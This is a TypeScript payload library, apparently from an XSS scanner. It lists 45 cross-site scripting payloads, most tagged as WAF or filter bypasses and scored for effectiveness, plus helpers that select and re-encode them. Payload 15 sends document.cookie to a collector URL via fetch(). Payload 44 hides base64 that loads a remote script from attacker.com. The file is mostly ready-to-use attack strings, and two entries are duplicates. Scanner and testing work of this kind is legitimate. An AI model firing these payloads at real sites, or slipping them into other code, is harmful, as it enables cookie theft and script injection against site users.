import { HTMLContext, Payload, EncodingType } from "@/types/scanner";
import { analyzeContext } from "./contextAnalysisUtils";
import * as wafBypassUtils from "./wafBypassUtils";

// Enhanced comprehensive payload library
export const getDefaultPayloads = (): Payload[] => [
  // Basic HTML context payloads
  {
    id: '1',
    value: '<script>alert(1)</script>',
    name: 'Basic Script Alert',
    category: 'basic',
    description: 'Basic script tag with alert function',
    context: ['html'],
    effectiveness: 7
  },
  {
    id: '2',
    value: '"><script>alert(1)</script>',
    name: 'Quote Breaking Script',
    category: 'basic',
    description: 'Script tag that breaks out of attributes',
    context: ['attribute'],
    effectiveness: 8
  },
  {
    id: '3',
    value: '</script><script>alert(1)</script>',
    name: 'Script Close Injection',
    category: 'basic',
    description: 'Closes any open script tag and injects a new one',
    context: ['script'],
    effectiveness: 7
  },
  {
    id: '4',
    value: '"; alert(1); //',
    name: 'Script Injection',
    category: 'basic',
    description: 'JavaScript code injection within script context',
    context: ['script'],
    effectiveness: 8
  },
  {
    id: '5',
    value: '<img src=x onerror=alert(1)>',
    name: 'Image Error Event',
    category: 'basic',
    description: 'Uses image error event to execute JavaScript',
    context: ['html'],
    effectiveness: 9
  },
  {
    id: '6',
    value: '" onmouseover="alert(1)',
    name: 'Mouseover Event',
    category: 'basic',
    description: 'Injects an onmouseover event handler',
    context: ['attribute'],
    effectiveness: 6
  },
  {
    id: '7',
    value: '<svg/onload=alert(1)>',
    name: 'SVG Onload Event',
    category: 'advanced',
    description: 'Uses SVG onload event to execute JavaScript',
    context: ['html'],
    effectiveness: 9
  },
  {
    id: '8',
    value: 'javascript:alert(1)',
    name: 'JavaScript Protocol',
    category: 'basic',
    description: 'Uses JavaScript protocol in a URL context',
    context: ['url'],
    effectiveness: 7
  },
  {
    id: '9',
    value: '--><script>alert(1)</script>',
    name: 'Comment Break',
    category: 'basic',
    description: 'Breaks out of HTML comment and executes script',
    context: ['comment'],
    effectiveness: 8
  },
  {
    id: '10',
    value: '<ScRiPt>alert(1)</ScRiPt>',
    name: 'Case Variation',
    category: 'waf-bypass',
    description: 'Script tag with mixed case to bypass filters',
    context: ['html'],
    effectiveness: 6
  },
  
  // WAF bypass techniques
  {
    id: '11',
    value: '<img src=`x` onerror=javascript:alert(1)>',
    name: 'Backtick Injection',
    category: 'waf-bypass',
    description: 'Uses backticks to bypass some WAF rules',
    context: ['html', 'attribute'],
    effectiveness: 7
  },
  {
    id: '12',
    value: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    name: 'SVG Animation',
    category: 'advanced',
    description: 'SVG animation element with onbegin event',
    context: ['html'],
    effectiveness: 8
  },
  {
    id: '13',
    value: '<body onload=alert(1)>',
    name: 'Body Onload',
    category: 'basic',
    description: 'Body tag with onload event',
    context: ['html'],
    effectiveness: 6
  },
  {
    id: '14',
    value: '<iframe src="javascript:alert(1)"></iframe>',
    name: 'iFrame Injection',
    category: 'advanced',
    description: 'iFrame with JavaScript source URL',
    context: ['html'],
    effectiveness: 7
  },
  {
    id: '15',
    value: '<img src=x onerror="fetch(\'https://example.com/collector\'+document.cookie)">',
    name: 'Blind Cookie Stealer',
    category: 'blind',
    description: 'Sends cookies to a collector URL',
    context: ['html'],
    effectiveness: 9
  },
  
  // New advanced payloads
  {
    id: '16',
    value: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    name: 'SVG Animation Event',
    category: 'advanced',
    description: 'Uses SVG animation event to execute JavaScript',
    context: ['html'],
    effectiveness: 8
  },
  {
    id: '17',
    value: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    name: 'Triple Nesting Bypass',
    category: 'waf-bypass',
    description: 'Uses triple nested tags to bypass WAF',
    context: ['html'],
    effectiveness: 9
  },
  {
    id: '18',
    value: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    name: 'Noscript Escape',
    category: 'advanced',
    description: 'Escapes from noscript context',
    context: ['html'],
    effectiveness: 7
  },
  {
    id: '19',
    value: '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>',
    name: 'Srcdoc Injection',
    category: 'advanced',
    description: 'Uses iframe srcdoc attribute to inject HTML',
    context: ['html'],
    effectiveness: 8
  },
  {
    id: '20',
    value: '"-confirm(1)-"',
    name: 'Attribute Expression',
    category: 'advanced',
    description: 'Mathematical operator abuse for JS execution',
    context: ['attribute'],
    effectiveness: 7
  },
  
  // DOM-based XSS payloads
  {
    id: '21',
    value: '<img src=x onerror=this.src=\'javascript:alert(1)\'>',
    name: 'DOM Element Modification',
    category: 'dom',
    description: 'Modifies element attribute to trigger XSS',
    context: ['html'],
    effectiveness: 8
  },
  {
    id: '22',
    value: '<w contenteditable onblur=alert(1)>lose focus!',
    name: 'Contenteditable Focus Event',
    category: 'dom',
    description: 'Triggers when contenteditable element loses focus',
    context: ['html'],
    effectiveness: 6
  },
  {
    id: '23',
    value: '<details open ontoggle=alert(1)>',
    name: 'Details Toggle Event',
    category: 'dom',
    description: 'Triggers on details element toggle',
    context: ['html'],
    effectiveness: 7
  },
  {
    id: '24',
    value: '<input autofocus onfocus=alert(1)>',
    name: 'Autofocus Injection',
    category: 'dom',
    description: 'Triggers on focus when element gets autofocus',
    context: ['html'],
    effectiveness: 8
  },
  {
    id: '25',
    value: '<video src=x onerror=alert(1)>',
    name: 'Video Error Event',
    category: 'dom',
    description: 'Error event on video element',
    context: ['html'],
    effectiveness: 7
  },
  
  // Framework-specific payloads
  {
    id: '26',
    value: '{{constructor.constructor(\'alert(1)\')()}}',
    name: 'Angular Expression',
    category: 'framework',
    description: 'Angular template expression injection',
    context: ['angular'],
    effectiveness: 9
  },
  {
    id: '27',
    value: 'react-text: {alert(1)}',
    name: 'React Text Injection',
    category: 'framework',
    description: 'React specific text injection',
    context: ['react'],
    effectiveness: 6
  },
  {
    id: '28',
    value: '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
    name: 'Vue HTML Binding',
    category: 'framework',
    description: 'Vue.js v-html directive injection',
    context: ['vue'],
    effectiveness: 8
  },
  
  // Polyglot payloads (work in multiple contexts)
  {
    id: '29',
    value: 'javascript:"/*\'/*`/*--><html \" */; alert(1)//`>',
    name: 'Basic XSS Polyglot',
    category: 'polyglot',
    description: 'Works in multiple different contexts',
    context: ['html', 'script', 'attribute', 'comment'],
    effectiveness: 10
  },
  {
    id: '30',
    value: '"><!--><script>alert(1)/*</script-->',
    name: 'HTML/Comment Polyglot',
    category: 'polyglot',
    description: 'Works in both HTML and comment contexts',
    context: ['html', 'comment'],
    effectiveness: 7
  },
  
  // Encoding-based payloads
  {
    id: '31',
    value: '&#x3C;img src=x onerror=alert(1)&#x3E;',
    name: 'Hex Entity Encoding',
    category: 'encoding-based',
    description: 'Hex HTML entity encoded payload',
    context: ['html'],
    encodings: ['html'],
    effectiveness: 8
  },
  {
    id: '32',
    value: '\\u003Cimg src=x onerror=alert(1)\\u003E',
    name: 'Unicode Escape',
    category: 'encoding-based',
    description: 'Unicode escaped payload',
    context: ['html', 'script'],
    encodings: ['javascript'],
    effectiveness: 7
  },
  {
    id: '33',
    value: '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">Click me</a>',
    name: 'URL Protocol Encoding',
    category: 'encoding-based',
    description: 'HTML entity encoded javascript protocol',
    context: ['url'],
    encodings: ['html'],
    effectiveness: 8
  },
  
  // Filter bypass payloads
  {
    id: '34',
    value: '<script>throw onerror=alert,1</script>',
    name: 'Throw Handler',
    category: 'filter-bypass',
    description: 'Uses throw handler for alert',
    context: ['html', 'script'],
    effectiveness: 7
  },
  {
    id: '35',
    value: '<script>[].filter.call(\'alert(1)\',top[\'eval\'])</script>',
    name: 'Filter Call Bypass',
    category: 'filter-bypass',
    description: 'Uses Array.filter to execute eval',
    context: ['script', 'html'],
    effectiveness: 6
  },
  {
    id: '36',
    value: '<img src="x" onmouseout="\u0061lert(1)" />',
    name: 'Unicode Alert',
    category: 'filter-bypass',
    description: 'Alert with first character as unicode',
    context: ['html', 'attribute'],
    effectiveness: 7
  },
  
  // Mutation-based payloads
  {
    id: '37',
    value: '<svg><animatetransform onbegin=alert(1)>',
    name: 'SVG Animate Transform',
    category: 'mutation-based',
    description: 'Uses SVG animation transforms',
    context: ['html'],
    effectiveness: 8
  },
  {
    id: '38',
    value: '<div onpointermove=alert(1)>Move mouse here</div>',
    name: 'Pointer Event',
    category: 'mutation-based',
    description: 'Uses pointer events API',
    context: ['html'],
    effectiveness: 6
  },
  {
    id: '39',
    value: '<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>',
    name: 'CSS Animation Trigger',
    category: 'mutation-based',
    description: 'Uses CSS animations to trigger XSS',
    context: ['html'],
    effectiveness: 7
  },
  {
    id: '40',
    value: '<script src="data:,alert(1)"></script>',
    name: 'Data URI Script',
    category: 'waf-bypass',
    description: 'Uses data URI in script src',
    context: ['html'],
    effectiveness: 8
  },
  
  // Extra WAF bypasses
  {
    id: '41',
    value: '<script>eval(atob(\'YWxlcnQoMSk=\'))</script>',
    name: 'Base64 Eval',
    category: 'waf-bypass',
    description: 'Executes base64 encoded alert',
    context: ['html', 'script'],
    effectiveness: 7
  },
  {
    id: '42',
    value: '<svg/onload=\u0061\u006C\u0065\u0072\u0074(1)>',
    name: 'Unicode Vector',
    category: 'waf-bypass',
    description: 'SVG onload with Unicode characters',
    context: ['html'],
    effectiveness: 8
  },
  {
    id: '43',
    value: '<x onclick=alert(1) y=1></x>',
    name: 'Custom Element',
    category: 'waf-bypass',
    description: 'Uses custom HTML element with event handler',
    context: ['html'],
    effectiveness: 6
  },
  {
    id: '44',
    value: '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXR0YWNrZXIuY29tL2EuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>',
    name: 'ID Attribute Base64',
    category: 'waf-bypass',
    description: 'Stores payload in id and executes with atob',
    context: ['html', 'attribute'],
    effectiveness: 9
  },
  {
    id: '45',
    value: '<a href="javascript&colon;alert(1)">Click</a>',
    name: 'HTML Entity Protocol',
    category: 'waf-bypass',
    description: 'Uses HTML entity in javascript protocol',
    context: ['url'],
    effectiveness: 7
  }
];

// Get payloads filtered by context
export const getPayloadsByContext = (context: HTMLContext): Payload[] => {
  const allPayloads = getDefaultPayloads();
  
  // First, get payloads specifically for this context
  const specificPayloads = allPayloads.filter(payload => payload.context.includes(context));
  
  // If no specific payloads, try to get polyglot payloads that work in multiple contexts
  if (specificPayloads.length === 0) {
    return allPayloads.filter(payload => payload.category === 'polyglot');
  }
  
  return specificPayloads;
};

// Enhanced WAF bypass application with context awareness
export const applyWafBypass = (
  payload: string, 
  context: HTMLContext = 'html'
): string[] => {
  return wafBypassUtils.applyWafBypass(payload, context);
};

// Enhanced context detection with more advanced pattern matching
export const detectContext = (html: string, injectionPoint: string): HTMLContext => {
  // Use the enhanced context analysis utility
  const analysis = analyzeContext(html, injectionPoint);
  return analysis.primaryContext;
};

// Generate a random XSS payload for demonstration purposes
export const generateRandomPayload = (): Payload => {
  const payloads = getDefaultPayloads();
  const randomIndex = Math.floor(Math.random() * payloads.length);
  return payloads[randomIndex];
};

// Get premium payloads (more advanced, effective payloads)
export const getPremiumPayloads = (): Payload[] => {
  const allPayloads = getDefaultPayloads();
  return allPayloads.filter(p => p.effectiveness && p.effectiveness >= 8);
};

// Get payloads by category
export const getPayloadsByCategory = (category: string): Payload[] => {
  const allPayloads = getDefaultPayloads();
  return allPayloads.filter(p => p.category === category);
};

// Get payloads that bypass specific filter types
export const getFilterBypassPayloads = (filterType: string): Payload[] => {
  const allPayloads = getDefaultPayloads();
  
  switch (filterType) {
    case 'strip-tags':
      return allPayloads.filter(p => 
        p.category === 'filter-bypass' || 
        p.value.includes('onload') || 
        p.value.includes('onerror')
      );
    
    case 'escape-quotes':
      return allPayloads.filter(p => 
        !p.value.includes('"') || 
        p.value.includes('`') ||
        p.category === 'encoding-based'
      );
      
    case 'html-encode':
      return allPayloads.filter(p => 
        p.encodings?.includes('javascript') ||
        p.category === 'encoding-based'
      );
      
    case 'keyword-filter':
      return allPayloads.filter(p => 
        p.category === 'waf-bypass' ||
        p.value.includes('\\u') ||
        !p.value.toLowerCase().includes('alert')
      );
      
    default:
      return allPayloads.filter(p => p.category === 'polyglot');
  }
};

// Adapt payload to match the target encoding
export const adaptPayloadEncoding = (payload: Payload, targetEncoding: EncodingType): string => {
  switch (targetEncoding) {
    case 'html':
      return payload.value
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
      
    case 'url':
      return encodeURIComponent(payload.value);
      
    case 'double-url':
      return encodeURIComponent(encodeURIComponent(payload.value));
      
    case 'base64':
      return typeof btoa !== 'undefined' ? btoa(payload.value) : Buffer.from(payload.value).toString('base64');
      
    case 'javascript':
      return payload.value.split('').map(char => {
        const hex = char.charCodeAt(0).toString(16);
        return `\\u${hex.padStart(4, '0')}`;
      }).join('');
      
    case 'hex':
      return payload.value.split('').map(char => {
        return `\\x${char.charCodeAt(0).toString(16)}`;
      }).join('');
      
    case 'unicode':
      return payload.value.split('').map(char => {
        return `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`;
      }).join('');
      
    default:
      return payload.value;
  }
};
